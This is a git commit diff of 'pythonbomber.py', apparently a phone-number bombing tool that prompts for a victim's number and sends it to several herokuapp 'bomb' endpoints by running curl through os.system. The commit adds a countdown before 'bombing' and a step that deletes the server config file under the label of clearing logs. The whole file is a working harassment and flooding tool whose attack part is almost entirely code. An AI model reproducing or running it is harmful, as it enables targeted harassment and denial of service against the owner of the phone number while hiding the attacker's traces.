fa3c53bef9b8f132561d163bfc2b1c3882f87079
shauryamishra444 <87108870+shauryamishra444@users.noreply.github.com>
2022-01-03 11:34:25 +0530

    Add files via upload

--- pythonbomber.py
+++ pythonbomber.py
@@ -8,10 +8,10 @@ def startup_time():
     os.system('clear')
     print(' ')
     print(' ')
-    print('[~]         Tool Started at '+Time)
+    print('[~]Tool Started at '+Time)
 print(startup_time())
 
-number = input('Should I tell you what to enter: ')
+number = input('[~]Enter the phone number of victim >_ ')
 
 server1 = (' https://xlr81.herokuapp.com/bomb/'+number)
 server2 = (' https://xlr82.herokuapp.com/bomb/'+number)
@@ -44,20 +44,38 @@ def write_srvers():
 def read_servers():
     f = open("serverconf.txt", "r")
     os.system("curl"+f.read())
+    print("[!] Clearing logs!")
+    try:
+        os.remove("serverconf.txt")
+        print("[✓] Successfully cleared logs!")
+    except Exception as e:
+        print("✗"+e)
+
 
 def main():
     write_srvers()
-    read_servers()
-    
-samay = int(input('Enter Sleep Time (0 for no sleep): '))
-os.system('clear')
-print('')
-print('')
-print('')
-print('___________Bombing will start in__________')
-print(samay)
-time.sleep(samay)
-print('Initiating Bombing Servers...')
-bombing_time()
-main()
+    read_servers() 
 
+def countdown(t):
+    
+    while t:
+        mins, secs = divmod(t, 60)
+        timer = '{:02d}:{:02d}'.format(mins, secs)
+        print("[#]  "+timer, end="\r")
+        time.sleep(1)
+        t -= 1
+    print("Initiating Bombing Servers...")
+    bombing_time()
+    main()
+#samay = int(input('Enter Sleep Time (0 for no sleep): '))
+#os.system('clear')
+#print('')
+#print('')
+#print('')
+#print('___________Bombing will start in__________')
+#print(samay)
+#time.sleep(samay)
+#print('Initiating Bombing Servers...')
+t = input("[~]Enter Bombing Delay in 'Seconds'(0 for NO DELAY) >_")
+print("[!] Bombing in")
+countdown(int(t))
